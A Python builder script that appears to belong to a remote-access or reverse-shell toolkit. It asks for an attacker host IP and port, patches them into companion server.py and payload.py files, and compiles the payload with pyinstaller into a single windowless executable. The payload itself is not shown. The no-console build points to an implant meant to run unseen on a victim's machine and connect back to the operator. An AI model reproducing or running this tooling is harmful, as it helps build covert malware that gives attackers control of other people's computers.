import os
# Setting up the Host IP and Port for the payload and server

host_ip = input('[+] Enter the Host IP: ')
port = int(input('[+] Enter the Connecting Port: '))

# for server file

serverFile = open('server.py', 'r')
arrServer = serverFile.readlines()
serverFile.close()

for count in range(0, len(arrServer)):
    if arrServer[count][0:9] == 'HOST_IP =':
        arrServer[count] = f"HOST_IP = '{host_ip}' \n"
        break
    
for count in range(0, len(arrServer)):
    if arrServer[count][0:6] == 'PORT =':
        arrServer[count] = f"PORT = {port} \n"
        break

serverFile = open('server.py', 'w')
serverFile.writelines(arrServer)
serverFile.close()


# for payload file

payloadFile = open('payload.py', 'r')
arrPayload = payloadFile.readlines()
payloadFile.close()

for count in range(0, len(arrPayload)):
    if arrPayload[count][0:9] == 'HOST_IP =':
        arrPayload[count] = f"HOST_IP = '{host_ip}' \n"
        break
    
for count in range(0, len(arrPayload)):
    if arrPayload[count][0:6] == 'PORT =':
        arrPayload[count] = f"PORT = {port} \n"
        break

payloadFile = open('payload.py', 'w')
payloadFile.writelines(arrPayload)
payloadFile.close()

# creating an executable

os.system('pyinstaller payload.py --onefile --noconsole')
